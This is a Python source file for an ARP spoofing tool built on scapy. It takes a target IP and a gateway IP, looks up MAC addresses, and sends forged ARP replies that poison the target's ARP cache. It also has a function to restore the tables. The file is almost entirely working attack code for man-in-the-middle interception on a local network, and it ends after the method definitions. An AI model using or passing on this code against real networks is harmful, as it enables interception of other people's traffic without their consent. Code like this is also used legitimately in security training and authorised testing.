#!/usr/bin/python3

import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import scapy.all as scapy
import time
import argparse

class ARP_Spoof:
    # ========================
    # Constructors
    # ========================
    def __init__(self):
        pass

    # ========================
    # Methods
    # ========================
    def get_args(self):
            parser = argparse.ArgumentParser()
            parser.add_argument("-t", "--tgt", dest="tgt_ip", help="IP Addr of the target system")
            parser.add_argument("-g", "--gateway", dest="gateway_ip", help="IP Addr of the gateway")
            args = parser.parse_args()

            if not args.tgt_ip:
                parser.error("[-] Must specify tgt IP Addr, use --help for more info")
            elif not args.gateway_ip:
                parser.error("[-] Must specify gatway IP Addr, use --help for more info")

            return args

    @staticmethod
    def get_mac_addr(ip):
        arp_request = scapy.ARP(pdst=ip) 
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req_broadcast = broadcast/arp_request
        answered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
        
        return answered[0][1].hwsrc

    @staticmethod
    def spoof(tgt_ip, spoof_ip):
        tgt_mac_addr = ARP_Spoof.get_mac_addr(tgt_ip)
        # op=2 is a response, not a request
        pkt = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac_addr, psrc=spoof_ip)
        scapy.send(pkt, verbose=False)

    @staticmethod
    def restore_tables(dst_ip, src_ip):
        dst_mac_addr = ARP_Spoof.get_mac_addr(dst_ip)
        src_mac_addr = ARP_Spoof.get_mac_addr(src_ip)
        pkt = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac_addr, psrc=src_ip, hwsrc=src_mac_addr)
        scapy.send(pkt, count=3, verbose=False)
        


